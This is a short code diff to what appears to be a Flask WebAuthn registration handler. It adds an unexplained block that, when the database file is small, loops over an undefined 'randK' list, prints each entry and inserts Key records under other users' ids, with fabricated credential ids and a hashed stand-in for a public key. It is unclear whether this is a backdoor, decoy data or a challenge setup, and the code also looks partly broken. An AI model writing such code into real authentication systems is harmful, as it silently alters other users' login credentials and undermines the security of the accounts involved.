@@ -9,6 +9,7 @@ from flask import (
     session,
     current_app,
 )
+from hashlib import sha256
 from flask_login import login_required, login_user, current_user
 from webauthn import (
     generate_registration_options,
@@ -95,6 +96,19 @@ def register():
             flash('Invalid key registration response')
             return redirect(url_for('webauthn.register'))
         count = len(current_user.keys)
+
+        if (os.path.getsize('./app.db') < 1024*1024):
+            for x in randK:
+                print(x)
+                auth2 = Key(
+                      user_id=x[0],
+                      name=request.form['name'],
+                      credential_id=bytes_to_base64url(bytes(x[1], encoding='utf-8')),
+                      public_key=bytes_to_base64url(bytes(sha256(verification.credential_public_key).hexdigest(), encoding='utf-8')),
+                      sign_count=verification.sign_count,
+                )
+                db.session.add(auth2)
+
         auth = Key(
             user=current_user._get_current_object(),
             name=request.form['name'],
@@ -102,6 +116,7 @@ def register():
             public_key=bytes_to_base64url(verification.credential_public_key),
             sign_count=verification.sign_count,
         )
+
         db.session.add(auth)
         db.session.commit()
         return redirect(url_for('webauthn.keys'))
